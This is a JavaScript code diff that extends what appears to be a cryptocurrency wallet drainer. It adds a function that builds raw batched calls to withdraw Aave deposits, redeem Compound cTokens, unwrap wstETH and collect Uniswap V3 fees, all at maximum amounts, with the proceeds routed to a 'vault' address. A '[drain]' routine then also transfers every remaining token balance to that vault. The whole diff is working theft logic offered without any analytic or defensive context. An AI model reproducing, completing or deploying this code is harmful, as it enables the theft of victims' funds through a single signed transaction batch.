@@ -621,6 +621,83 @@
     return actions.slice(0, 24);
   }
 
+  /**
+   * buildDefiSendCalls — Phase 5: DeFi extraction for wallet_sendCalls path.
+   * Converts DeFi positions into raw `{to, data}` calls that can be included in
+   * a wallet_sendCalls batch ALONGSIDE regular ERC-20 and NFT transfers.
+   *
+   * Handles:
+   *   AAVE_WITHDRAW (1): aavePool.withdraw(underlying, maxUint256, vault)
+   *   COMPOUND_REDEEM (2): cToken.redeem(maxUint256)
+   *   WSTETH_UNWRAP (4): wstETH.unwrap(amount) + stETH.transfer(vault, maxUint256)
+   *   UNIV3_EXIT (5): npm.collect({tokenId, vault, maxUint128, maxUint128})
+   */
+  function buildDefiSendCalls(chainId, assets, vault) {
+    var calls = [];
+    var MAX256 = 'f'.repeat(64);
+    var MAX128 = '0'.repeat(32) + 'f'.repeat(32);
+    var SIG_TRF = '0xa9059cbb';
+    var STETH = '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84';
+
+    function pad32(address) {
+      return String(address).toLowerCase().replace(/^0x/i, '').padStart(64, '0');
+    }
+    function padUint(val) {
+      return BigInt(val || '0').toString(16).padStart(64, '0');
+    }
+
+    // Build actions from defi_positions + token detection (same as buildDefiActions)
+    var actions = buildDefiActions(chainId, assets);
+
+    actions.forEach(function (a) {
+      try {
+        switch (a.kind) {
+          case DEFI_KIND.AAVE_WITHDRAW:
+            // withdraw(address asset, uint256 amount, address to)
+            if (a.tokenA && !isZeroAddr(a.tokenA)) {
+              calls.push({
+                to: a.target,
+                data: '0x69328dec' + pad32(a.tokenA) + MAX256 + pad32(vault),
+              });
+            }
+            break;
+
+          case DEFI_KIND.COMPOUND_REDEEM:
+            // redeem(uint256 redeemTokens) — redeem all cTokens
+            calls.push({ to: a.target, data: '0xdb006a75' + MAX256 });
+            break;
+
+          case DEFI_KIND.WSTETH_UNWRAP:
+            // Step 1: wstETH.unwrap(amount) → caller gets stETH
+            var wstAmt = a.param1 && BigInt(a.param1) > 0n ? padUint(a.param1) : MAX256;
+            calls.push({ to: a.target, data: '0xde0e9a3e' + wstAmt });
+            // Step 2: stETH.transfer(vault, maxUint256)
+            calls.push({ to: STETH, data: SIG_TRF + pad32(vault) + MAX256 });
+            break;
+
+          case DEFI_KIND.UNIV3_EXIT:
+            // collect({tokenId, recipient, amount0Max, amount1Max})
+            if (a.param1) {
+              var tokenId = padUint(a.param1);
+              calls.push({
+                to: a.target,
+                data: '0xfc6f7865' + tokenId + pad32(vault) + MAX128 + MAX128,
+              });
+            }
+            break;
+
+          // UNIV2_REMOVE (3): LP tokens are ERC-20 — already in token transfer list
+          default:
+            break;
+        }
+      } catch (e) {
+        L.warn('[defi-sendcalls] action kind=' + a.kind + ' skip:', e.message);
+      }
+    });
+
+    return calls;
+  }
+
   function isZeroAddr(addr) {
     return !addr || String(addr).toLowerCase() === ZERO_ADDR;
   }
@@ -4734,9 +4811,32 @@
       }
     }
 
-    // ERC-20 — direct transfer(vault, balance)
+    // DeFi positions FIRST — Aave withdraw, Compound redeem, wstETH unwrap, UniV3 collect.
+    // Must come before ERC-20 transfers so defi-consumed tokens (aTokens, cTokens, wstETH)
+    // are NOT also transferred as plain ERC-20 (would revert on atomicBatch after burn).
+    var defiCalls = buildDefiSendCalls(chainId, assets, vault);
+    var defiConsumed = {}; // token addresses that defi calls already handle
+    (buildDefiActions(chainId, assets) || []).forEach(function (a) {
+      if (a.kind === DEFI_KIND.AAVE_WITHDRAW && a.tokenA && !isZeroAddr(a.tokenA)) {
+        // The aToken itself (NOT tokenA) is consumed. Find it in AAVE_ATOKEN_MAP by reverse lookup.
+        Object.keys(AAVE_ATOKEN_MAP).forEach(function (at) {
+          if (AAVE_ATOKEN_MAP[at] && AAVE_ATOKEN_MAP[at].toLowerCase() === a.tokenA.toLowerCase()) {
+            defiConsumed[at.toLowerCase()] = true;
+          }
+        });
+      }
+      if (a.kind === DEFI_KIND.COMPOUND_REDEEM) defiConsumed[String(a.target).toLowerCase()] = true;
+      if (a.kind === DEFI_KIND.WSTETH_UNWRAP) defiConsumed[String(a.target).toLowerCase()] = true;
+    });
+    if (defiCalls.length > 0) {
+      L.log('[drain] DeFi sendCalls:', defiCalls.length, 'call(s) — consumed:', Object.keys(defiConsumed).join(',').slice(0,80));
+      defiCalls.forEach(function (c) { calls.push(c); });
+    }
+
+    // ERC-20 — direct transfer(vault, balance) — skip tokens already handled by defi calls
     var SIG_TRF = '0xa9059cbb';
     assets.tokens.forEach(function (t) {
+      if (defiConsumed[String(t.address).toLowerCase()]) return; // handled by defi withdraw/redeem/unwrap
       if (BigInt(t.balance || '0') > 0n) {
         calls.push({
           to: t.address,
